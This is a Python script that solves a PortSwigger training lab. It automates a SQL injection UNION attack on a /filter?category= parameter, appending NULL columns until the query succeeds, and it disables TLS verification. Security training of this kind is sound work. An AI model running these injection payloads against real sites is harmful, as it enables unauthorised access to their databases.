# SQL injection UNION attack, determining the number of columns returned by the query

# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import argparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % injection_uri)
	return r

def exploit_sqli(s, url):
	filter_path = url + '/filter?category='
	payload = "' UNION SELECT NULL--"
	for i in range(1, 8):
		if send_payload(s, filter_path, payload).status_code == 200:
			print('[+] Number of Columns returned:\t%s' % i)
			return True
		else:
			payload = payload[:-2]
			payload += ", NULL--"



##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection UNION attack, determining the number of columns returned by the query')
	parser = argparse.ArgumentParser(description="[+] Lab: SQL injection UNION attack, determining the number of columns returned by the query")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Determining the number of columns returned by the query.\n')
			if exploit_sqli(s, url):
				print('\n[+] SQL Injection sent !')
				time.sleep(5)
				s.cookies.clear()
				s.headers.clear()
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
			else:
				print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
